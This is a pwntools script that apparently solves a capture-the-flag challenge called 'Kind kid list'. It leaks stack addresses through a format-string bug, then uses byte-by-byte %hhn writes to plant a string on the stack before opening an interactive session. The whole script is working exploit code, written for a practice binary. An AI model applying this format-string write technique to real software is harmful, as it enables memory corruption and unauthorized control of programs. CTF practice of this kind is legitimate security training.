from pwn import *

rem = process("./Pwnable/Kind kid list/problem/deploy/kind_kid_list")
# gdb.attach(rem)

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%10$s")
print(rem.recvline())

rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b": ", b"%p")
rsp_addr = int(rem.recvn(14)[2:].decode(), 16)
print(hex(rsp_addr))

# 0x6E $rsp+0x30
# 0x72 $rsp+0x31
# 0x33 $rsp+0x32
# 0x76 $rsp+0x33
# 0x79 $rsp+0x34
# 0x77 $rsp+0x35
rem.sendlineafter(b">> ", b"2")
payload = f"%{0x6e}c%7$hhn".encode() # 8글자 제한...?
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x30)
rem.sendlineafter(b": ", payload)

rem.sendlineafter(b">> ", b"2")
payload = f"%{0x72}c%7$hhn".encode()
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x31)
rem.sendlineafter(b": ", payload)

rem.sendlineafter(b">> ", b"2")
payload = f"%{0x33}c%7$hhn".encode()
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x32)
rem.sendlineafter(b": ", payload)

rem.sendlineafter(b">> ", b"2")
payload = f"%{0x76}c%7$hhn".encode()
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x33)
rem.sendlineafter(b": ", payload)

rem.sendlineafter(b">> ", b"2")
payload = f"%{0x79}c%7$hhn".encode()
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x34)
rem.sendlineafter(b": ", payload)

rem.sendlineafter(b">> ", b"2")
payload = f"%{0x77}c%7$hhn".encode()
payload = payload.ljust(8, b"a")
payload += p64(rsp_addr + 0x35)
rem.sendlineafter(b": ", payload)


rem.sendlineafter(b">> ", b"1")

rem.interactive()